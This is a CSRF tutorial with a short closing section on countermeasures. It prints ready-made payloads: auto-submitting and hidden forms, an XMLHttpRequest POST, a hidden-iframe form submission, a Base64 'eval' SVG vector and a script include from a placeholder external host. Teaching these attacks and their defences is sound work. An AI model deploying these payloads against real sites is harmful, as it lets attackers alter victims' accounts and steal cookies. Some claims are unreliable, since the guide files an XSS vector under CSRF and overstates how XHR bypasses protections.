### Overview of Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is a type of attack where an attacker tricks a user into performing an action on a web application without their consent. This happens by exploiting the trust a web application has in the user's browser, leading to unintended actions being carried out on behalf of the user (who is authenticated) without their knowledge.

### Basic CSRF Protection Bypass Techniques

**1. Basic Form Submission**

The following example demonstrates a **basic form submission** that automatically submits a POST request to a vulnerable server. The form contains parameters like `username` and `status`, which the attacker can manipulate.

```html
<form name="pls" action="<https://xxx.fr/index.php?action=profile>" method="post">
  <div class="form-group">
    <label>Username:</label>
    <input name="username" value="devsid" type="text">
  </div>
  <br>
  <div class="form-group">
    <label>Status:</label>
    <input name="status" checked="checked" type="checkbox">
  </div>
  <br>
  <button type="submit">Submit</button>
</form>
<script language="javascript">
  document.pls.submit();
</script>
```

**Details:**
- This form is automatically submitted using JavaScript when the page is loaded.
- The attacker can pre-fill the form with malicious values, such as a `username` and `status` value, causing a POST request to be made to the target server with the attacker's data.
- The user does not have to interact with the form for the attack to work, making it a form of **silent CSRF**.

---

**2. Basic Hidden Form**

This approach uses a hidden form to automatically submit a POST request with pre-set values. This method is often used in scenarios where the attacker wants to send requests in the background.

```html
<html>
<body>
  <form name="csrf" action="<https://xxx.fr/index.php?action=profile>" method="POST">
    <input type="hidden" name="username" value="aaa">
    <input type="hidden" name="status" value="on">
  </form>
  <script type="text/javascript">
    document.csrf.submit();
  </script>
</body>
</html>
```

**Details:**
- The form inputs are hidden from the user, and the attacker can set values like `username` and `status` to whatever they desire.
- As soon as the page loads, the hidden form is submitted via JavaScript, making a POST request to the server with the forged data.
- No user interaction is needed for this attack.

---

**3. Using XMLHttpRequest**

The **XMLHttpRequest** method allows for sending requests directly from JavaScript. This is a more advanced technique where the attacker uses JavaScript to make a POST request in the background, without any visible interaction from the user.

```html
<script>
var formData = new FormData();
formData.append("username", "test");
formData.append("status", "on");
var request = new XMLHttpRequest();
request.open("POST", "<https://xxx.fr/index.php?action=profile>");
request.send(formData);
</script>
```

**Details:**
- The `XMLHttpRequest` object sends an asynchronous POST request with `username` and `status` parameters.
- This method provides a higher degree of control over the request, allowing attackers to manipulate headers or payloads more flexibly.
- Since the request is sent asynchronously, the user does not see anything happening on the page.

---

**4. Encoded Payload (Base64 Encoding)**

Sometimes, the attacker can obfuscate their malicious payload by encoding it in **Base64**. This can help bypass simple filters that check for specific payloads like `<script>` or `<img>` tags.

```html
<svg/onload=eval(atob('<base64 payload>'));//>
```

**Details:**
- The payload is **Base64 encoded**, making it harder to detect by security filters that might be scanning for specific attack vectors.
- When decoded, the Base64 payload executes JavaScript (e.g., opening a pop-up, stealing cookies, etc.).
- This technique can bypass some basic content security policies or filtering systems.

---

**5. Using an Invisible iFrame**

In this technique, the attacker loads a target form inside an invisible `<iframe>` and uses JavaScript to manipulate the form fields and submit the request. The form submission occurs without the user’s interaction, making this a **stealthy attack**.

```html
// Load the form in an invisible frame
document.write('<iframe id="iframe" src="<https://xxx.fr/index.php?action=profile>" width="0" height="0" onload="pwn()"></iframe>');

// Modify the form fields and submit
function pwn() {
  var iframeDoc = document.getElementById('iframe').contentDocument;
  var form = iframeDoc.forms[0];
  form.username.value = 'titi';
  form.status.checked = true;
  form.status.disabled = false;
  form.submit();
}
```

**Details:**
- The form is loaded inside an invisible iframe, meaning it is **invisible to the user** but still active on the page.
- JavaScript modifies the form’s values and submits it without the user being aware of the action.
- This attack is highly **undetectable** by the user.

---

**6. Load External Script**

An attacker can also load an external malicious script on a vulnerable page. The script could contain CSRF attack logic or any other malicious behavior.

```html
<script src="<http://XXXXXXX/csrf.js>"></script>
```

**Details:**
- The attacker can host a script (such as a CSRF attack script) on an external server and include it in a vulnerable page.
- This script can perform various actions, including submitting malicious forms or triggering other CSRF-based exploits.
- This technique depends on the ability to inject or control scripts on a vulnerable page.

---

### Advanced Techniques

**1. Bypassing CSRF Tokens**

Some web applications protect against CSRF by using **tokens** in the form. These tokens are designed to be unpredictable and unique, which makes it difficult for attackers to forge a valid request. However, there are ways to bypass these protections:

- **Guessable Tokens**: Some applications use **predictable or sequential** tokens that attackers can guess, especially if the tokens are simple integers or based on an easily guessable pattern.
  
- **Token Exposure**: In some cases, tokens are exposed through **URLs**, **logs**, or **inconsistent sessions**, making it easier for attackers to retrieve the token and reuse it for a malicious request.

---

**2. Targeting Unprotected Actions**

Some actions on the web application may not be **protected by CSRF tokens** or may **not require authentication** at all. These unprotected actions are prime targets for CSRF attacks. Examples include:

- **Changing account settings**: Actions like updating the user’s email or password.
- **Submitting forms**: Any form that submits data to the server without proper CSRF protection.
- **File uploads**: Insecure file upload functionality may be vulnerable to CSRF.

---

**3. Combining CSRF with Other Attacks (XSS + CSRF)**

CSRF can be combined with **Cross-Site Scripting (XSS)** to create more powerful and automated attacks. For example, an attacker could exploit an XSS vulnerability on a page to inject a **CSRF payload**, thus making the attack fully automatic and without any user interaction.

**Example Attack:**

1. The attacker finds an **XSS vulnerability** on a page.
2. The attacker injects a **CSRF payload** (such as a hidden form submission or XMLHttpRequest) within the XSS payload.
3. When a user visits the page, the XSS vulnerability triggers and executes the CSRF payload, performing malicious actions on behalf of the user.

---

### Countermeasures Against CSRF

**1. Use CSRF Tokens**

- **Generate unique tokens** for each form submission.
- Tokens must be included in the request and verified on the server-side to ensure they are legitimate.
- **Ensure tokens are random** and difficult to guess.

**2. Use SameSite Cookies**

- Set the **SameSite** attribute on cookies to prevent them from being sent with cross-origin requests. This helps mitigate CSRF attacks by preventing malicious sites from accessing authentication cookies in cross-origin requests.

  ```text
  Set-Cookie: sessionid=abc123; SameSite=Strict;
  ```

  The `SameSite=Strict` setting prevents the browser from sending the cookie in requests from other websites, which helps protect against CSRF.

**3. Validate the Referer Header**

- **Check the `Referer` header** of incoming requests to ensure that requests originate from trusted sources. While this is not a foolproof method (due to spoofing), it can add an extra layer of defense.

---

### Conclusion

CSRF attacks are a powerful way to exploit the trust between a web application and a user's browser. While basic CSRF protection mechanisms like tokens can help mitigate these attacks, more sophisticated techniques such as XMLHttpRequest or XSS-based CSRF can bypass these protections. Therefore, web applications must employ multiple layers of defense, such as using **CSRF tokens**, setting **SameSite cookies**, and **validating referers**, to ensure robust protection against these types of attacks.
